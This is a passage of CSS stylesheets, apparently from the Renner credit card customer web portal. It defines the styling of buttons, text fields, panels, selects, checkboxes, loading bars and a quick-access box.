         .cartao-renner .meu-cartao .single-page-button .button,
         .cartao-renner .meu-cartao .single-page-button .button:focus {
         border-color: #1e1e1f;
         background-color: #1e1e1f;
         color: #fff; }
         .cartao-renner .single-page-button .button:active,
         .meu-cartao .single-page-button .button:active,
         .meu-cartao .cartao-renner .single-page-button .button:active,
         .cartao-renner .meu-cartao .single-page-button .button:active {
         border-color: #000;
         background-color: #313133;
         color: #fff; }
         .cartao-renner .single-page-button .button:active svg path,
         .meu-cartao .single-page-button .button:active svg path,
         .meu-cartao .cartao-renner .single-page-button .button:active svg path,
         .cartao-renner .meu-cartao .single-page-button .button:active svg path {
         fill: #fff; }
         .cartao-renner .single-page-button .button:active svg rect,
         .meu-cartao .single-page-button .button:active svg rect,
         .meu-cartao .cartao-renner .single-page-button .button:active svg rect,
         .cartao-renner .meu-cartao .single-page-button .button:active svg rect {
         fill: #fff; }
         .cartao-renner .single-page-button .button[disabled], .cartao-renner .single-page-button .button[disabled]:focus, .cartao-renner .single-page-button .button[disabled]:active, .cartao-renner .single-page-button .button[disabled]:hover, .cartao-renner .single-page-button .button.button--disabled, .cartao-renner .single-page-button .button.button--disabled:focus, .cartao-renner .single-page-button .button.button--disabled:active, .cartao-renner .single-page-button .button.button--disabled:hover,
         .meu-cartao .single-page-button .button[disabled],
         .meu-cartao .single-page-button .button[disabled]:focus,
         .meu-cartao .single-page-button .button[disabled]:active,
         .meu-cartao .single-page-button .button[disabled]:hover,
         .meu-cartao .single-page-button .button.button--disabled,
         .meu-cartao .single-page-button .button.button--disabled:focus,
         .meu-cartao .single-page-button .button.button--disabled:active,
         .meu-cartao .single-page-button .button.button--disabled:hover,
         .meu-cartao .cartao-renner .single-page-button .button[disabled],
         .meu-cartao .cartao-renner .single-page-button .button[disabled]:focus,
         .meu-cartao .cartao-renner .single-page-button .button[disabled]:active,
         .meu-cartao .cartao-renner .single-page-button .button[disabled]:hover,
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled,
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled:focus,
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled:active,
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled:hover,
         .cartao-renner .meu-cartao .single-page-button .button[disabled],
         .cartao-renner .meu-cartao .single-page-button .button[disabled]:focus,
         .cartao-renner .meu-cartao .single-page-button .button[disabled]:active,
         .cartao-renner .meu-cartao .single-page-button .button[disabled]:hover,
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled,
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled:focus,
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled:active,
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled:hover {
         border-color: #ddd;
         background-color: #ddd;
         cursor: default;
         color: #fff; }
         @media only screen and (min-width: 998px) {
         .buttons--outline .cartao-renner .single-page-button .button:hover, .buttons--outline .cartao-renner .single-page-button .button:hover:focus, .cartao-renner .single-page-button .button.button--outline:hover, .cartao-renner .single-page-button .button.button--outline:hover:focus, .buttons--outline
         .meu-cartao .single-page-button .button:hover, .buttons--outline
         .meu-cartao .single-page-button .button:hover:focus,
         .meu-cartao .single-page-button .button.button--outline:hover,
         .meu-cartao .single-page-button .button.button--outline:hover:focus, .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button:hover, .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button:hover:focus,
         .meu-cartao .cartao-renner .single-page-button .button.button--outline:hover,
         .meu-cartao .cartao-renner .single-page-button .button.button--outline:hover:focus, .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button:hover, .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button:hover:focus,
         .cartao-renner .meu-cartao .single-page-button .button.button--outline:hover,
         .cartao-renner .meu-cartao .single-page-button .button.button--outline:hover:focus {
         border-color: #000;
         background-color: #000;
         color: #fff; } }
         .buttons--outline .cartao-renner .single-page-button .button, .buttons--outline .cartao-renner .single-page-button .button:focus, .cartao-renner .single-page-button .button.button--outline, .cartao-renner .single-page-button .button.button--outline:focus, .buttons--outline
         .meu-cartao .single-page-button .button, .buttons--outline
         .meu-cartao .single-page-button .button:focus,
         .meu-cartao .single-page-button .button.button--outline,
         .meu-cartao .single-page-button .button.button--outline:focus, .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button, .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button:focus,
         .meu-cartao .cartao-renner .single-page-button .button.button--outline,
         .meu-cartao .cartao-renner .single-page-button .button.button--outline:focus, .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button, .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button:focus,
         .cartao-renner .meu-cartao .single-page-button .button.button--outline,
         .cartao-renner .meu-cartao .single-page-button .button.button--outline:focus {
         border: 1px solid #1e1e1f;
         background-color: #fff;
         color: #1e1e1f; }
         .buttons--outline .cartao-renner .single-page-button .button:active, .cartao-renner .single-page-button .button.button--outline:active, .buttons--outline
         .meu-cartao .single-page-button .button:active,
         .meu-cartao .single-page-button .button.button--outline:active, .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button:active,
         .meu-cartao .cartao-renner .single-page-button .button.button--outline:active, .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button:active,
         .cartao-renner .meu-cartao .single-page-button .button.button--outline:active {
         border-color: #000;
         background-color: #313133;
         color: #fff; }
         :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled], :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled]:focus, :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled]:active, :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled]:hover,
         :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button.button--disabled,
         :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button.button--disabled:active,
         :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button.button--disabled:hover, :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled], :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled]:focus, :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled]:active, :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled]:hover,
         :not(.loader--show) .cartao-renner .single-page-button .button.button--outline.button--disabled,
         :not(.loader--show) .cartao-renner .single-page-button .button.button--outline.button--disabled:focus,
         :not(.loader--show) .cartao-renner .single-page-button .button.button--outline.button--disabled:active,
         :not(.loader--show) .cartao-renner .single-page-button .button.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button[disabled], :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button[disabled]:focus, :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button[disabled]:active, :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button.button--disabled,
         :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .meu-cartao .single-page-button .button.button--disabled:hover, :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline[disabled], :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline[disabled]:focus, :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline[disabled]:active, :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline[disabled]:hover,
         :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline.button--disabled,
         :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline.button--disabled:focus,
         :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline.button--disabled:active,
         :not(.loader--show)
         .meu-cartao .single-page-button .button.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button[disabled], :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button[disabled]:focus, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button[disabled]:active, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .single-page-button .button.button--disabled:hover, :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled], :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled]:focus, :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled]:active, :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline[disabled]:hover,
         :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled,
         :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled:focus,
         :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled:active,
         :not(.loader--show)
         .meu-cartao .cartao-renner .single-page-button .button.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button[disabled], :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button[disabled]:focus, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button[disabled]:active, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .single-page-button .button.button--disabled:hover, :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled], :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled]:focus, :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled]:active, :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline[disabled]:hover,
         :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled,
         :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled:focus,
         :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled:active,
         :not(.loader--show)
         .cartao-renner .meu-cartao .single-page-button .button.button--outline.button--disabled:hover {
         border: 1px solid #ddd;
         background-color: #fff;
         cursor: default;
         color: #ddd; }
         .cartao-renner .single-page-button .loader--show .button,
         .cartao-renner .single-page-button .loader--show .button[disabled],
         .meu-cartao .single-page-button .loader--show .button,
         .meu-cartao .single-page-button .loader--show .button[disabled],
         .meu-cartao .cartao-renner .single-page-button .loader--show .button,
         .meu-cartao .cartao-renner .single-page-button .loader--show .button[disabled],
         .cartao-renner .meu-cartao .single-page-button .loader--show .button,
         .cartao-renner .meu-cartao .single-page-button .loader--show .button[disabled] {
         border: 2px solid transparent;
         background-color: #1e1e1f;
         color: #fff; }
         .cartao-renner .single-page-button .button i svg path,
         .meu-cartao .single-page-button .button i svg path,
         .meu-cartao .cartao-renner .single-page-button .button i svg path,
         .cartao-renner .meu-cartao .single-page-button .button i svg path {
         fill: #1e1e1f; }
         .cartao-renner .single-page-button .button i svg rect,
         .meu-cartao .single-page-button .button i svg rect,
         .meu-cartao .cartao-renner .single-page-button .button i svg rect,
         .cartao-renner .meu-cartao .single-page-button .button i svg rect {
         fill: #1e1e1f; }
         input {
         border-radius: 0; }
         .ie input[type=text]::-ms-clear {
         display: none; }
         .textfield {
         box-sizing: border-box;
         display: inline-block;
         position: relative;
         margin: 0;
         padding: 13px 0 0 0;
         width: 100%;
         max-width: 100%;
         font-size: 16px; }
         .textfield__input {
         display: block;
         margin: 0;
         border: none;
         border-bottom: 1px solid transparent;
         background: none;
         padding: 6px 0;
         width: 100%;
         text-align: left;
         color: inherit;
         font-family: Roboto, Arial, Helvetica, Helvetica Neue, sans-serif;
         font-size: 16px;
         font-weight: 400; }
         .textfield__input[type="number"] {
         -moz-appearance: textfield; }
         .textfield__input[type="number"]::-webkit-inner-spin-button, .textfield__input[type="number"]::-webkit-outer-spin-button {
         margin: 0;
         -webkit-appearance: none; }
         .textfield__input:focus {
         outline: none; }
         .textfield textarea.textfield__input {
         display: block; }
         .textfield__label {
         display: block;
         position: absolute;
         top: 19px;
         right: 0;
         bottom: 0;
         left: 0;
         -webkit-transition-duration: 0.2s;
         transition-duration: 0.2s;
         -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
         transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
         overflow: hidden;
         text-align: left;
         line-height: 1;
         white-space: nowrap;
         font-size: 16px;
         pointer-events: none; }
         .textfield__input:focus + .textfield__label,
         .textfield__input--blocked + .textfield__label,
         .textfield__input.not-empty + .textfield__label,
         .textfield__input.ng-not-empty + .textfield__label {
         top: 0;
         visibility: visible;
         font-size: 13px; }
         .textfield--with-icon {
         position: relative; }
         .textfield--with-icon .textfield__input {
         padding-left: 30px; }
         .textfield--with-icon .textfield__label {
         left: 30px; }
         .textfield--without-icon {
         position: relative; }
         .textfield--without-icon .textfield__input {
         padding-left: 0; }
         .textfield--without-icon .textfield__label {
         left: 0; }
         .textfield__icon {
         position: absolute;
         top: 21px;
         left: 0;
         z-index: 2;
         vertical-align: middle;
         width: 16px;
         height: 16px; }
         .textfield__prefix {
         position: absolute;
         top: 13px;
         left: 0;
         margin-top: 3px; }
         .textfield__input {
         border-bottom-color: #706f6f;
         color: #acacac; }
         .textfield__input ~ .textfield__icon {
         color: #706f6f; }
         .textfield__input ~ .textfield__prefix {
         color: #706f6f; }
         .textfield__input ~ .textfield__label {
         color: #acacac; }
         .textfield__input.ng-validate.ng-dirty.ng-invalid {
         border-bottom-color: #cf3e3e;
         color: #1e1e1f; }
         .textfield__input.ng-validate.ng-dirty.ng-invalid ~ .textfield__icon {
         color: #cf3e3e; }
         .textfield__input.ng-validate.ng-dirty.ng-invalid ~ .textfield__prefix {
         color: #cf3e3e; }
         .textfield__input.ng-validate.ng-dirty.ng-invalid ~ .textfield__label {
         color: #706f6f; }
         .textfield__input:focus {
         border-bottom-color: #1e1e1f;
         color: #1e1e1f; }
         .textfield__input:focus ~ .textfield__icon {
         color: #1e1e1f; }
         .textfield__input:focus ~ .textfield__prefix {
         color: #1e1e1f; }
         .textfield__input:focus ~ .textfield__label {
         color: #706f6f; }
         .textfield__input:hover {
         border-bottom-color: #1e1e1f;
         color: #1e1e1f; }
         .textfield__input:hover ~ .textfield__icon {
         color: #1e1e1f; }
         .textfield__input:hover ~ .textfield__prefix {
         color: #1e1e1f; }
         .textfield__input:hover ~ .textfield__label {
         color: #acacac; }
         .textfield__input.not-empty {
         border-bottom-color: #1e1e1f;
         color: #1e1e1f; }
         .textfield__input.not-empty ~ .textfield__icon {
         color: #1e1e1f; }
         .textfield__input.not-empty ~ .textfield__prefix {
         color: #1e1e1f; }
         .textfield__input.not-empty ~ .textfield__label {
         color: #706f6f; }
         .textfield__input--blocked {
         border-bottom-color: #acacac !important;
         color: #acacac !important; }
         .textfield__input--blocked ~ .textfield__icon {
         color: #acacac !important; }
         .textfield__input--blocked ~ .textfield__prefix {
         color: #acacac !important; }
         .textfield__input--blocked ~ .textfield__label {
         color: #acacac !important; }
         .textfield__input--readonly {
         border-bottom-color: #1e1e1f !important;
         color: #1e1e1f !important; }
         .textfield__input--readonly ~ .textfield__icon {
         color: #1e1e1f !important; }
         .textfield__input--readonly ~ .textfield__prefix {
         color: #1e1e1f !important; }
         .textfield__input--readonly ~ .textfield__label {
         color: #706f6f !important; }
         .field-message {
         display: block;
         visibility: hidden;
         padding-top: 5px;
         width: 100%;
         min-height: 20px;
         line-height: 1;
         font-size: 12px; }
         .field-message--error {
         color: #cf3e3e; }
         .field-message--success {
         color: #3ecf7a; }
         .ng-validate.ng-dirty.ng-invalid ~ .field-message {
         visibility: visible; }
         .banner-app {
         background-color: #2c2c2e;
         color: #fff; }
         .banner-app__image {
         display: block;
         margin: 0 auto; }
         .banner-app__text .banner-app__text-icons {
         display: block;
         margin-bottom: 25px; }
         .banner-app__text .banner-app__text-title,
         .banner-app__text .banner-app__text-paragraph {
         margin-bottom: 20px;
         font-weight: 300; }
         .banner-app__text .banner-app__text-title {
         line-height: 100%;
         letter-spacing: -0.5px;
         font-size: 34px; }
         .banner-app__text .banner-app__text-paragraph {
         line-height: 24px;
         font-size: 18px; }
         .banner-app__text .banner-app__text-apps {
         display: -webkit-box;
         display: flex; }
         .banner-app__text .banner-app__text-apps a:first-child {
         margin-right: 10px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .ie .banner-app {
         display: block; }
         .banner-app__text {
         padding-right: 60px; }
         .banner-app__text .banner-app__text-title {
         font-size: 25px; }
         .banner-app__text .banner-app__text-paragraph {
         letter-spacing: -0.5px;
         font-size: 15px; } }
         .sem-cartao .layout .layout__content-container {
         display: none; }
         .layout {
         position: relative;
         margin: 40px 0 0;
         padding-bottom: 70px; }
         .layout .layout__content-container .form-center-column {
         margin: 0 auto; }
         @media only screen and (min-width: 768px) and (max-width: 997px) {
         .layout {
         padding-right: 20px;
         padding-left: 20px; }
         .layout__content-container {
         -webkit-box-flex: 0;
         flex: 0 0 65%;
         padding-right: 0;
         padding-left: 30px;
         max-width: 65%; }
         .top-bar,
         .top-bar ul {
         background-color: #1e1e1f; } }
         @media only screen and (max-width: 767px) {
         .top-bar {
         display: none; }
         .layout {
         margin-top: 0; }
         .layout__content-container {
         margin-top: 10px; } }
         .box-error:before {
         display: block;
         position: absolute;
         top: 0;
         left: 0;
         z-index: 1;
         width: 100%;
         height: 100%;
         content: ""; }
         @media print, screen and (min-width: 48em) {
         .box-error:before {
         background-position: 0 bottom;
         background-repeat: no-repeat; } }
         .box-error .template-container {
         min-height: 700px; }
         .box-error .template-container .logo {
         display: none;
         -webkit-transform-origin: center;
         transform-origin: center;
         margin: 30px auto 2rem; }
         .box-error .template-container .card {
         margin: 70px auto 210px;
         padding: 40px 30px; }
         .box-error .template-container .card .card__title {
         line-height: 110%;
         color: #8a8a8a;
         font-size: 16px;
         font-weight: 300;
         font-style: normal; }
         @media (max-width: 767px) {
         .box-error .template-container .card {
         margin-bottom: 50px;
         padding: 30px; } }
         .block {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         height: 100%; }
         .block .block__footer {
         padding-top: 20px; }
         .block__header {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-bottom: 15px; }
         .block__header-title {
         position: relative; }
         .block__header-title .block__header-icon {
         position: absolute;
         top: 50%;
         left: 0;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         margin-right: 6px;
         width: 30px;
         height: 30px; }
         .block__header-title .block__header-icon svg {
         width: 100%; }
         .block__header-title .block__header-text {
         display: inline-block;
         margin: 0;
         padding-left: 40px;
         font-size: 22px;
         font-weight: 300; }
         @media (max-width: 767px) {
         .block__header-title .block__header-text {
         font-size: 18px; } }
         .block__header-title .block__header-tooltip {
         position: absolute;
         top: 0;
         right: 0;
         cursor: pointer;
         color: #acacac; }
         .block__collapsible-toggle {
         width: 100%;
         text-align: center; }
         .panel--full-header.panel .block__header {
         margin-right: -1.875rem;
         margin-left: -1.875rem; }
         .panel--full-header .block__header {
         margin-bottom: 30px;
         border-radius: 3px;
         background-color: #f2f2f2;
         padding: 12px 0; }
         .panel--full-header .block__header .block__header-title .block__header-text {
         padding-left: 1.875rem;
         font-size: 16px; }
         .panel--full-header .block__header .block__header-title .block__header-icon {
         display: none; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .panel--full-header.panel .block__header {
         margin-right: -0.625rem;
         margin-left: -0.625rem; } }
         @media only screen and (max-width: 767px) {
         .panel--full-header.panel .block__header {
         margin-right: -0.625rem;
         margin-bottom: 15px;
         margin-left: -0.625rem; }
         .panel--full-header.panel .block__header .block__header-title .block__header-text {
         padding-left: 0.625rem;
         letter-spacing: -0.5px; } }
         .panel .panel__cell {
         position: relative;
         border: 1px solid #e0e0e0;
         border-radius: 3px;
         background-color: #fff; }
         .panel.panel--cover .panel__cell {
         border: 0;
         padding: 0; }
         .panel .panel__cell {
         margin: 0 0 1.25rem 0; }
         @media print, screen and (min-width: 48em) {
         .panel .panel__cell {
         margin: 0 0 1.875rem 0; } }
         .panel .panel__cell,
         .row.collapse .column.panel__cell,
         .row.collapse .panel__cell.columns,
         .row.collapse .columns.panel__cell {
         padding: 1rem; }
         .panel.panel--full-header .panel__cell,
         .panel--full-header.row.collapse .column.panel__cell,
         .panel--full-header.row.collapse .panel__cell.columns,
         .panel--full-header.row.collapse .columns.panel__cell {
         padding: 0 1.875rem 1.875rem; }
         @media (min-width: 1024px) {
         .panel .panel__cell:not(:only-child):not(:first-child):not(:last-child) {
         border-radius: 0; }
         .panel__cell:not(:only-child):first-child {
         border-top-right-radius: 0;
         border-bottom-right-radius: 0; }
         .panel__cell:not(:only-child):last-child {
         border-top-left-radius: 0;
         border-bottom-left-radius: 0; }
         .panel .panel__cell:not(:only-child):not(:last-child):not(.panel_cell--full-width) {
         border-right: 0; } }
         @media (max-width: 1023px) {
         .panel .panel__cell,
         .row.collapse .column.panel__cell,
         .row.collapse .panel__cell.columns,
         .row.collapse .columns.panel__cell {
         padding: 0.625rem; }
         .panel.panel--full-header .panel__cell,
         .panel--full-header.row.collapse .column.panel__cell,
         .panel--full-header.row.collapse .panel__cell.columns,
         .panel--full-header.row.collapse .columns.panel__cell {
         padding: 0 0.625rem 0.625rem; }
         .panel .panel__cell {
         margin-bottom: 0.625rem; }
         .panel .panel__cell:not(:only-child):not(:last-child):not(.panel_cell--full-width) {
         border-bottom: 0; }
         .panel .panel__cell:not(:only-child):not(:first-child) {
         border-top: 0; }
         .panel .panel__cell:not(:only-child):not(:first-child):not(:last-child) {
         border-top-left-radius: 0;
         border-top-right-radius: 0;
         border-bottom-right-radius: 0; }
         .panel__cell:not(:only-child):first-child {
         border-bottom-left-radius: 0;
         border-bottom-right-radius: 0; }
         .panel__cell:not(:only-child):last-child {
         border-top-left-radius: 0;
         border-top-right-radius: 0; } }
         .collapsible--collapsing,
         .collapsible--expanding {
         position: relative;
         -webkit-transition: height 0.3s;
         transition: height 0.3s;
         overflow: hidden; }
         .collapsible--expanded {
         display: block; }
         .collapsible-arrow {
         display: inline-block;
         -webkit-transform: rotate(-135deg);
         transform: rotate(-135deg);
         -webkit-transition: 0.25s;
         transition: 0.25s;
         outline: none;
         border: solid #acacac;
         border-width: 0 2px 2px 0;
         cursor: pointer;
         padding: 6px; }
         .collapsible--collapsed .collapsible-arrow {
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg); }
         .collapsible--collapsed.collapsible--all {
         display: none; }
         @media (max-width: 767px) {
         .collapsible--collapsed.collapsible--small {
         display: none; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .collapsible--collapsed.collapsible--medium {
         display: none; } }
         @media (min-width: 1024px) and (max-width: 1199px) {
         .collapsible--collapsed.collapsible--large {
         display: none; } }
         @media (min-width: 1200px) {
         .collapsible--collapsed.collapsible--xlarge {
         display: none; } }
         .select {
         display: inline-block;
         position: relative;
         border: 1px solid #0a0a0a;
         border-radius: 3px;
         padding: 0 30px 0 15px;
         overflow: hidden;
         text-align: left;
         text-overflow: ellipsis;
         line-height: 38px;
         white-space: nowrap; }
         .select:after {
         position: absolute;
         top: 50%;
         right: 15px;
         margin-top: -0.15em;
         border-top: 0.3em solid #0a0a0a;
         border-right: 0.3em solid transparent;
         border-left: 0.3em solid transparent;
         vertical-align: middle;
         content: ""; }
         select option[value="?"]:first-child {
         display: none; }
         .select select {
         position: absolute;
         top: 0;
         left: 0;
         opacity: 0;
         z-index: 2;
         margin: 0;
         border: 0;
         padding: 0;
         width: 100%;
         height: 100%; }
         .select select :focus {
         outline: none; }
         .select__icon {
         display: inline-block;
         margin-right: 3px;
         vertical-align: middle;
         line-height: 15px;
         width: 16px;
         height: 16px; }
         .select__icon svg {
         display: inline-block; }
         .meu-cartao .cartao-renner .select,
         .cartao-renner .select {
         border-color: #d71920;
         color: #d71920; }
         .meu-cartao .cartao-renner .select:after,
         .cartao-renner .select:after {
         border-top-color: #d71920; }
         .cartao-renner .meu-cartao .select,
         .meu-cartao .select {
         border-color: #ac8947;
         color: #ac8947; }
         .cartao-renner .meu-cartao .select:after,
         .meu-cartao .select:after {
         border-top-color: #ac8947; }
         .meu-cartao .select--default .select,
         .cartao-renner .select--default .select {
         border-color: #1e1e1f;
         color: #1e1e1f; }
         .meu-cartao .select--default .select:after,
         .cartao-renner .select--default .select:after {
         border-top-color: #1e1e1f; }
         .fade {
         -webkit-transition: 0.5s;
         transition: 0.5s; }
         .fade.ng-enter {
         opacity: 0; }
         .fade.ng-leave {
         opacity: 1; }
         .fade.ng-enter.ng-enter-active {
         opacity: 1; }
         .fade.ng-leave.ng-leave-active {
         opacity: 0; }
         .loading-bar-container {
         display: block;
         position: relative;
         margin: 35px 0;
         border-radius: 5px;
         background-color: #e8e8e8;
         width: 100%;
         height: 5px;
         overflow: hidden; }
         .loading-bar-container #ngProgress {
         -webkit-transition: all 0.5s ease-in-out;
         transition: all 0.5s ease-in-out;
         opacity: 0;
         z-index: 500;
         margin: 0;
         background-color: #1ba149 !important;
         padding: 0;
         height: 5px !important;
         color: #1ba149 !important; }
         .loading-bar-container #ngProgress-container {
         position: absolute;
         top: 0;
         right: 0;
         left: 0;
         z-index: 500;
         margin: 0;
         padding: 0; }
         .checkbox {
         display: inline-block;
         position: relative; }
         .checkbox input[type="checkbox"] {
         display: none; }
         .checkbox label {
         padding-left: 30px;
         text-transform: none; }
         .checkbox label:before {
         position: absolute;
         top: 50%;
         margin-top: -10px;
         margin-left: -30px;
         border: 1px solid #acacac;
         width: 20px;
         height: 20px;
         content: ""; }
         .checkbox label:after {
         display: none;
         position: absolute;
         top: 50%;
         left: 6px;
         -webkit-transform: rotate(405deg);
         transform: rotate(405deg);
         margin-top: -9px;
         border: 3px solid #3ecf7a;
         border-top: 0;
         border-left: 0;
         border-radius: 3px;
         width: 8px;
         height: 14px;
         content: ""; }
         .checkbox input[type="checkbox"]:checked + label:after {
         display: initial; }
         .ie .checkbox input[type="checkbox"],
         .ie .checkbox input[type="checkbox"],
         .edge .checkbox input[type="checkbox"],
         .edge .checkbox input[type="checkbox"] {
         display: block; }
         .ie .checkbox label,
         .ie .checkbox label,
         .edge .checkbox label,
         .edge .checkbox label {
         padding-left: 10px; }
         .ie .checkbox label:before, .ie .checkbox label:after,
         .ie .checkbox label:before,
         .ie .checkbox label:after,
         .edge .checkbox label:before,
         .edge .checkbox label:after,
         .edge .checkbox label:before,
         .edge .checkbox label:after {
         display: none; }
      </style>
      <style type="text/css">.acesso-rapido {
         box-sizing: border-box;
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: justify;
         justify-content: space-between;
         border-width: 3px;
         border-style: solid;
         border-color: #1e1e1f;
         padding: 20px 24px;
         width: 100%;
         height: 120px; }
         .acesso-rapido h2 {
         margin: 0;
         text-align: center;
         line-height: 1;
         font-size: 16px; }
         .acesso-rapido .button {
         height: 40px;
         line-height: 35px; }
         .acesso-rapido.animated {
         -webkit-animation: box-appear 300ms linear 700ms both, box-grow 600ms linear both;
         animation: box-appear 300ms linear 700ms both, box-grow 600ms linear both; }
         .modal-acesso-rapido .modal__content {
         margin-bottom: 30px; }
         .modal-acesso-rapido .modal__content p {
         margin: 0; }
         .modal-acesso-rapido .modal__actions {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .modal-acesso-rapido .modal__actions .button {
         width: 100%; }
         .modal-acesso-rapido .modal__actions .button:first-child {
         margin-bottom: 20px; }
         @-webkit-keyframes box-appear {
         0% {
         opacity: 0; }
         100% {
         opacity: 1; } }
         @keyframes box-appear {
         0% {
         opacity: 0; }
         100% {
         opacity: 1; } }
         @-webkit-keyframes box-grow {
         0% {
         padding: 0;
         height: 0; }
         100% {
         border-width: 3px;
         padding: 20px 24px;
         height: 120px; } }
         @keyframes box-grow {
         0% {
         padding: 0;
         height: 0; }
         100% {
         border-width: 3px;
         padding: 20px 24px;
         height: 120px; } }
      </style>
      <style type="text/css">.ir-versao-completa {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         border: 1px solid #e0e0e0;
         padding: 20px 0;
         width: 100%;
         text-align: center; }
         .ir-versao-completa h2 {
         margin-top: 0;
         margin-bottom: 15px;
         font-size: 20px; }
         .ir-versao-completa p {
         margin-top: 0;
         margin-bottom: 15px;
         max-width: 370px;
         font-size: 16px; }
         .ir-versao-completa .button {
         width: 320px; }
         @media (max-width: 767px) {
         .ir-versao-completa {
         border: none;
         padding: 10px; }
         .ir-versao-completa h2 {
         font-size: 16px; }
         .ir-versao-completa p {
         font-size: 14px; }
